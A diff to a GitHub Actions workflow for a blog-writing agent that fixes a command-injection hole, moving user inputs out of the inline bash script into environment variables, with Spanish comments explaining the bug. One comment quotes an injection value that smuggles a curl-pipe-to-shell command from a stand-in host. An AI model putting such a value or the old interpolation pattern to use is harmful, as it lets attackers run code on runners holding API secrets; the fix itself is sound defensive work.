@@ -44,15 +44,30 @@ jobs:
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
           BLOG_AGENT_SECRET: ${{ secrets.BLOG_AGENT_SECRET }}
+          # 🔴 Los tres inputs entran por `env`, NO interpolados dentro del `run`.
+          # Hasta el 1 sep 2026 el tema se pegaba tal cual en el script: GitHub
+          # sustituye el texto ANTES de que bash lo vea, así que un tema como
+          #   '; curl evil.sh | sh; '
+          # se ejecutaba en el runner, que lleva ANTHROPIC_API_KEY y
+          # BLOG_AGENT_SECRET en el entorno. Por `env` el valor llega como dato
+          # a una variable y bash nunca lo interpreta como código.
+          DRY_RUN: ${{ inputs.dry_run }}
+          FORCE: ${{ inputs.force }}
+          TOPIC: ${{ inputs.topic }}
         run: |
-          ARGS=""
-          if [[ "${{ github.event.inputs.dry_run }}" == "true" ]]; then
-            ARGS="$ARGS --dry-run"
-          fi
-          if [[ "${{ github.event.inputs.force }}" == "true" ]]; then
-            ARGS="$ARGS --force"
-          fi
-          if [[ -n "${{ github.event.inputs.topic }}" ]]; then
-            ARGS="$ARGS --topic '${{ github.event.inputs.topic }}'"
-          fi
-          node index.js $ARGS
+          set -euo pipefail
+          # Array, no cadena: con `ARGS="$ARGS --topic '$TOPIC'"` + `node $ARGS`
+          # sin comillas, un tema con espacios llegaba partido en varios
+          # argumentos y el agente buscaba sólo la primera palabra.
+          # ⚠️ `if`, NO `[[ … ]] && …`: con `set -e` una lista `&&` cuyo test
+          # falla devuelve 1 y ABORTA el paso. En la corrida DIARIA los tres
+          # inputs vienen vacíos, así que el primer test habría matado al agente
+          # del blog todos los días.
+          # El array arranca CON el comando dentro para que nunca esté vacío:
+          # con `set -u`, expandir "${args[@]}" de un array vacío revienta en
+          # bash viejo, y la corrida diaria es justo la que no lleva argumentos.
+          cmd=(node index.js)
+          if [[ "${DRY_RUN:-false}" == "true" ]]; then cmd+=(--dry-run); fi
+          if [[ "${FORCE:-false}"   == "true" ]]; then cmd+=(--force);   fi
+          if [[ -n "${TOPIC:-}" ]];             then cmd+=(--topic "$TOPIC"); fi
+          "${cmd[@]}"
